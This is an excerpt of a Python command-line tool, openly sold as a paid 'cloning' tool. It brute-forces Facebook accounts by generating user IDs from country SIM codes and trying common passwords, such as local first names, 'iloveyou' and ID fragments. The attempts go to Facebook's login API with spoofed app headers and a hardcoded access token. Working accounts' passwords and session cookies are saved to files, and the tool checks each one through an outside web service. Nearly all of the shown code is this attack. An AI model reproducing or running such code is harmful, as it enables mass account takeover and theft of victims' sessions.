...
print(f'\x1b[38;5;196m(\x1b[38;5;48m=\x1b[38;5;196m)\x1b[38;5;48m Loading Installed plz w8 for Tools ')
try:
...
def limon1():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/427.0.0.31.63;FBBV/444411021;FBDM/{density=2.25,width=720,height=1280};FBLC/it_IT;FBRV/256855919;FBCR/Nepal Telecom;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/'+str(kkkkki)+';FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2128};FB_FW/1;]'
        return ua
...
logo=(f"""{A}
{G}8888888b.         d8888 888    d8P  8888888 888888b.        
{A}888   Y88b       d88888 888   d8P     888   888  "88b       
{G}888    888      d88P888 888  d8P      888   888  .88P       
{A}888   d88P     d88P 888 888d88K       888   8888888K.       
{G}8888888P"     d88P  888 8888888b      888   888  "Y88b      
{A}888 T88b     d88P   888 888  Y88b     888   888    888      
{G}888  T88b   d8888888888 888   Y88b    888   888   d88P     
{A}888   T88b d88P     888 888    Y88b 8888888 8888888P" 
{R}[{G}9{R}]     {R}[{G}9{R}]     {R}[{G}9{R}]
{G}--------------------------------------------------
{R}[{G}={R}]{G} DEVELOPR {R}:{G} RAKIB-999
{R}[{G}={R}]{G} FACEBOOK {R}:{G} MOHAMMAD RAKIB HASAN 
{R}[{G}={R}]{G} TOOLS {R}   :{A} FILE{G}ð’Š¹ï¸Žï¸Žï¸Ž{A}RANDOM
{R}[{G}={R}]{G} STATUS {R}  :{G} FREE
{R}[{G}={R}]{G} VERSION {R} :{A} 0{G}ð’Š¹ï¸Žï¸Žï¸Ž{A}13
{A}--------------------------------------------------""")
##---------------APPROVAL------------##
def approval():
  clear()
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print(f'{R}[{G}1{R}]{G} Your Key {R}:{G} RAKIB=['+id+']=XD')
      linex()
      print(f"{R}[{G}1{R}]{G} This Is Paid Tool ")
      linex()
      input(f'{R}[{G}1{R}]{G} Click Enter To Sent Key Admin WhatsApp ')
      tks = ('Hello%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20'+id);os.system('am start https://wa.me/+8801724273808?text='+tks)
      time.sleep(1)
      exit()
  except:
    sys.exit()
...
def Main_MRM():
        ...
        linex()
        opt1 = input(f"{R}[{G}?{R}]{G} CHOOSE {R}:{G} ")
        if opt1 == "1": file()   
        elif opt1 == "2":
...
def file():
    ...
    clear();print(f'{R}[{G}={R}]{G} Method {R}[{G}M1{R}]{G} ');print(f'{R}[{G}={R}]{G} Method {R}[{G}M2{R}]{G} ');linex()
    ...
    try:
        ...
        ps_limit =1
    clear()
    print(f'{R}[{G}={R}]{G} Example {R}:{G} firstlast {R}|{G} first@@ {R}|{G} first123 {R}[{G}ETC{R}]{G}');linex()
    for i in range(ps_limit):
        plist.append(input(f"{R}[{G}={R}]{G} Password No {R}[{G}%s{R}]{G} {R}:{G} "%(i+1)))
    with tred(max_workers=30) as MRM:
        clear()
        tl = str(len(fo))
        print(f'                {R}[{G}METHOD{R}ð’Š¹ï¸Žï¸Žï¸Ž{G}FILE{R}]{G}');linex()
    ...
    print(f"{R}[{G}={R}]{G} Cloning Accounts Saved in /sdcard/RAKIB_M1_FILE_OK.txt")
    print(f'\r{R}--------------------------------------------------')
...
def bd():
                ...
                with tred(max_workers=30) as MRM:     
                        clear()
                        tl = str(len(user))
                        print(f'             {R}[{G}METHOD{R}ð’Š¹ï¸Žï¸Žï¸Ž{G}BD UID{R}]{G}');linex()
                        print(f'{R}[{G}={R}]{G} Total Id {R}:{A}',tl)
                        print(f'{R}[{G}={R}]{G} Sim Code {R}:{A}',code)
                        print(f'{R}[{G}={R}]{G} If No Result {R}[{A}On{R}/{A}Off{R}]{G} Airplane Mode ');linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [ids[:8],ids[:7],ids[:6],ids[5:],ids[3:],ids[4:],ids[2:],ids,'i love you','iloveyou','alamin','nabila','halima','jannat','ariyan','nadiya','trisha','@@@###','fflover','sadiya','sabbir','sanjida','sumaiya','bangladesh','fariya','113355','shahin','nusrat','jesmin','ayesha','saiful','saidul','nazmul','112200','121234','506070','708090','203040','sarmin','mahadi','aaabbb','59595952']
...
def ind():
                ...
                with tred(max_workers=30) as MRM:     
                        clear()
                        tl = str(len(user))
                        print(f'            {R}[{G}METHOD{R}ð’Š¹ï¸Žï¸Žï¸Ž{G}IND UID{R}]{G}');linex()
                        print(f'{R}[{G}={R}]{G} Total Id {R}:{A}',tl)
                        print(f'{R}[{G}={R}]{G} Sim Code {R}:{A}',code)
                        print(f'{R}[{G}={R}]{G} If No Result {R}[{A}On{R}/{A}Off{R}]{G} Airplane Mode ');linex()
                        for psx in user:
                                ids =code+psx
                                passlist = [psx[2:],psx,code+psx,code+psx[:3],'57273200','59039200','59595952','57575751','657575751']
                                MRM.submit(rd1,ids,passlist)
                print(f'\r{R}--------------------------------------------------')
                print(f"{R}[{G}={R}]{G} Cloning Hasbeen Completed ")
                print(f'{R}[{G}={R}]{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
...
def gmail():
                ...
                with tred(max_workers=30) as MRM:
                        total = str(len(fo))
                        clear()
                        print(f'             {R}[{G}METHOD{R}ð’Š¹ï¸Žï¸Žï¸Ž{G}GMILE UID{R}]{G}');linex()
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write(f'\r{R}[{G}RAKIB{R}]{A}-{R}[{G}%s{R}]{A}-{R}[{G}OK{R}]{A}-{R}[{G}%s{R}] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						cookie = f"RAKIB={ssbb};{ckkk}"
						res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
						if res == 'LIVE':
							print(f'\r{R}[{G}RAKIB-OKðŸ’š{R}]{G} '+uid+f' {R}|{G} '+pas)
							print(f"\r{R}[{G}COOKIE{R}]{A}->{G} {cookie}")
							file_path_ok = os.path.join(folder_path, 'RAKIB-RANDOM-OK.txt')
							file_path_cookies = os.path.join(folder_path, 'RAKIB-RANDOM-COOKIE.txt')
						...
						break
						if res == 'LOCK':
							print(f'\r\r\33[1;36m[RAKIB-LOCK] {uid} | {pas}')
						break
				elif 'www.facebook.com' in po['error']['message']:
						uid = str(po['error']['error_data']['uid'])
						print('\r\r\x1b[38;5;46mRAKIB-OKðŸ’š '+uid+' | '+pas+'\033[1;97m')
						#print(f'\r\033[1;32[Account Create Date] '+_bristy_(uid)+' \ [Date Of Birth]' +getDOB(cookie)+' '+'\033[1;92m')
						file_path = os.path.join(folder_path, 'RAKIB-CP.txt')
...
def api1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}[{G}RAKIB-M1{R}]{A}-{R}[{G}%s{R}]{A}-{R}[{G}OK{R}]{A}-{R}[{G}%s{R}] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    print(f'\r{R}[{G}RAKIB-OKðŸ’š{R}]{G} '+uid+f' {R}|{G} '+pas)
                    print(f"\r{R}[{G}COOKIE{R}]{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'RAKIB-FILE-M1-OK.txt')
                    open('/sdcard/RAKIB/RAKIB-FILE-M1-OK-COOKIE.txt','a').write(uid+' | '+pas+' |------> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}[{Y}RAKIB-CP{R}]{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'RAKIB-FILE-M1-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
...
def api2(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[RAKIB-M2]=[%s]=[OK|CP]=[%s|0]\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			head = {'User-Agent':limon1(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m[M2][RAKIB-OKðŸ’š] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'RAKIB_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
					...
					uid = str(po['error']['error_data']['uid'])
					print(f'\r\r\33[1m\33[1;35m[M2]=[RAKIB-CP] '+uid+' | '+pas+'\033[1;97m')
					file_path = os.path.join(folder_path, 'RAKIB-CP.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					cps.append(uid)
